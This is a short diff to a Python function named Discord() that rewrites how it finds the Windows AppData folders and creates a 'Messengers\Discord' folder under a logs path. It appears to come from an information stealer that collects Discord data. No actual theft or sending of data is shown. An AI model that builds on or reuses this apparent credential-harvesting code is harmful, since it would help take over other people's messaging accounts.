@@ -63,10 +63,9 @@ def Discord():
     ]
     try:
         Log("===========Messagers===========")
-        local = environ['USERPROFILE'] + sep + r'AppData\Local'
-        roaming = environ['USERPROFILE'] + sep + r'AppData\Roaming'
-        user = environ['USERPROFILE']
-        pathtofile = f'{user}\\{config.pathToLogs}'
+        local = environ["LOCALAPPDATA"]
+        roaming = environ["APPDATA"]
+        pathtofile = config.pathToLogs
         makedirs(f'{pathtofile}\\Messengers\\Discord', exist_ok=True)
         for dir in dirs:
             try:
